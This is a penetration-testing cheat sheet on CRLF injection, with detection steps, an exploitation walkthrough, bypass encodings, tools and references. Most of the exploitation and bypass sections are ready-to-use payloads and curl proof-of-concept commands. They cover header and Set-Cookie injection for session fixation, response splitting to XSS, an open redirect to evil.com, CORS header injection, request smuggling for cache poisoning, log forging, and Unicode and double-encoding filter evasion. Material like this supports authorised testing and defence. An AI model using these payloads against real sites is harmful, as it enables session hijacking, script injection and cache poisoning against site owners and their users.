# CRLF Injection

> **Summary**: CRLF injection occurs when an attacker injects Carriage Return (`\r`) and Line Feed (`\n`) characters into user-supplied input, allowing manipulation of HTTP headers, response splitting, and log injection.
> **Impact**: HTTP header injection, HTTP response splitting, session fixation, XSS via injected headers, cache poisoning, log forging.
> **Typical Severity**: Medium | High

## Detection

### Indicators
- User input reflected in HTTP response headers (e.g., `Location`, `Set-Cookie`, custom headers)
- URL parameters, path segments, or header values echoed back in the response
- Redirect endpoints that include user-supplied values in the `Location` header
- Log files that incorporate user-controlled data without sanitization

| Description     | Character | ASCII (Decimal) | ASCII (Hex) | URL Encoded |
|-----------------|-----------|-----------------|-------------|-------------|
| Carriage Return | `\r`      | `13`            | `0x0D`      | `%0D`       |
| Line Feed       | `\n`      | `10`            | `0x0A`      | `%0A`       |

### Automated Detection
```bash
# crlfuzz - fast CRLF injection scanner
crlfuzz -u "https://example.com"

# CRLFsuite - comprehensive scanner
crlfsuite -u "https://example.com"

# Scan a list of URLs
crlfuzz -l urls.txt
```

### Manual Detection
1. Inject `%0d%0a` into URL parameters and observe response headers
2. Check if injected `Set-Cookie` or custom headers appear in the response
3. Test in path segments: `https://example.com/%0d%0aTest-Header:injected`
4. Test in query parameters: `https://example.com/page?param=value%0d%0aInjected-Header:test`
5. Use the Burp payload `/%0D%0ASet-Cookie:mycookie=myvalue` and check if the cookie is set

## Exploitation

### Prerequisites
- User-supplied input reflected in HTTP response headers
- Lack of CRLF character filtering/encoding in the application

### Step-by-Step
1. **Identify reflection points**: find parameters or paths where input appears in response headers
2. **Inject basic CRLF**: append `%0d%0a` followed by a header name and value
3. **Confirm injection**: check if the injected header appears in the HTTP response
4. **Escalate**: attempt response splitting, XSS injection, or session fixation
5. **Test encoding variations**: if basic injection is filtered, try alternative encodings

### Payloads

#### Basic CRLF -- Header Injection
```
# Inject a Set-Cookie header
%0d%0aSet-Cookie:admin=true

# Inject a custom header
%0d%0aX-Injected:true

# In a redirect parameter
https://example.com/redirect?url=https://example.com%0d%0aSet-Cookie:session=attacker_value
```

#### HTTP Response Splitting
```
# Inject a complete second response
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>
```

#### CRLF to XSS
```
# Inject XSS via response splitting
http://example.com/page?param=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

# XSS with XSS-Protection disabled
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23

# In URL path
/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```

#### CRLF to Open Redirect
```
/%0d%0aLocation:%20http://evil.com

//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
/google.com/%2F..%0D%0AHeader-Test:test2
```

#### Session Fixation via Set-Cookie Injection
```
https://example.com/page?lang=en%0d%0aSet-Cookie:%20session=attacker_controlled_value
https://example.com/page?lang=en%0d%0aSet-Cookie:%20PHPSESSID=attacker_session_id
```

#### Log Injection
```
# Inject fake log entries
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```

#### CRLF to CORS Header Injection
```
# Inject Access-Control-Allow-Origin to bypass SOP
%0d%0aAccess-Control-Allow-Origin:%20*
%0d%0aAccess-Control-Allow-Credentials:%20true
```

#### Header Injection to Request Smuggling
```
# Keep-alive + second request injection
GET /%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1

# Malicious prefix injection for cache poisoning
GET /%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/malicious%20HTTP/1.1%0d%0aHost:%20evil.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1
```

### Proof of Concept
```
# 1. Test basic header injection
curl -v "https://example.com/redirect?url=https://example.com%0d%0aSet-Cookie:test=injected"

# 2. Check response headers for injected Set-Cookie
# If "Set-Cookie: test=injected" appears in response -> vulnerable

# 3. Escalate to XSS
curl -v "http://example.com/page?param=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E"
```

## Bypasses

### URL Encoding Variations
```
# Standard encoding
%0d%0a
%0D%0A

# Double encoding
%250d%250a
%250D%250A

# Mixed case
%0D%0a
%0d%0A
```

### Unicode CRLF Alternatives
```
# Unicode equivalents that some parsers interpret as CRLF
%E5%98%8A = %0A (Line Feed)    \u560a
%E5%98%8D = %0D (Carriage Return) \u560d
%E5%98%BE = %3E (>)            \u563e
%E5%98%BC = %3C (<)            \u563c

# Unicode CRLF payload
%E5%98%8A%E5%98%8DSet-Cookie:%20admin=true
```

### Advanced Unicode / Control Character Bypasses
When WAFs strip literal `\r`/`\n`, try alternative line terminators:
```
# LINE SEPARATOR (U+2028)
%E2%80%A8

# PARAGRAPH SEPARATOR (U+2029)
%E2%80%A9

# NEXT LINE (U+0085)
%C2%85

# Combined with payload
/%0A%E2%80%A8Set-Cookie:%20admin=true
```
Some Java, Python, and Go frameworks convert these to `\n` during header parsing.

### WAF Evasion via Content-Encoding Trick
```
# Inject Content-Encoding: identity to make browsers render attacker-supplied HTML
%0d%0aContent-Encoding:%20identity%0d%0aContent-Length:%2030%0d%0a
```
Because `Content-Encoding: identity` is allowed by RFC 9110, many reverse-proxies forward it unchanged.

### Only CR or Only LF
```
# Some servers accept just LF without CR
%0a
%0ASet-Cookie:%20test=value

# Or just CR
%0d
%0DSet-Cookie:%20test=value
```

## Escalation
- Chain CRLF with [XSS](xss.md): inject `<script>` tags via HTTP response splitting
- Chain with [Cache Poisoning](cache-poisoning.md): poison cached responses with injected headers
- Chain with **Session Fixation**: inject `Set-Cookie` headers to fix victim session
- Chain with **Open Redirect**: inject `Location` header to redirect users
- Chain with **CORS bypass**: inject `Access-Control-Allow-Origin` headers
- Chain with **HTTP Request Smuggling**: use header injection to craft a second request via keep-alive
- Chain with **SSRF**: inject new HTTP requests via CRLF in HTTP client parameters (e.g., PHP SoapClient `user_agent`)
- Chain with **Memcache Injection**: inject memcache commands when user input reaches a memcache backend without sanitization

## Tools

| Tool | Usage |
|------|-------|
| [crlfuzz](https://github.com/dwisiswant0/crlfuzz) | Wordlist-based CRLF fuzzer with Unicode newline payload support |
| [CRLFsuite](https://github.com/Raghavd3v/CRLFsuite) | Fast active CRLF injection scanner |
| [crlfix](https://github.com/glebarez/crlfix) | Utility to test and patch CRLF in HTTP requests from Go programs |
| Burp Suite | Intercept and inject CRLF payloads manually in Repeater |
| [CRLF wordlist](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt) | Brute-force detection payloads |

## References
- [Invicti - CRLF HTTP Header Injection](https://www.invicti.com/blog/web-security/crlf-http-header/)
- [Acunetix - CRLF Injection](https://www.acunetix.com/websitesecurity/crlf-injection/)
- [PortSwigger - Making HTTP Header Injection Critical via Response Queue Poisoning](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
- [EdOverflow CRLF Cheatsheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md)
- [CVE-2024-45302 - RestSharp CRLF Injection](https://nvd.nist.gov/vuln/detail/CVE-2024-45302)
- [CVE-2024-51501 - Refit Header Injection](https://github.com/reactiveui/refit/security/advisories/GHSA-2024-51501)
- [Praetorian - Unicode Newlines Bypass Research](https://security.praetorian.com/blog/2023-unicode-newlines-bypass/)
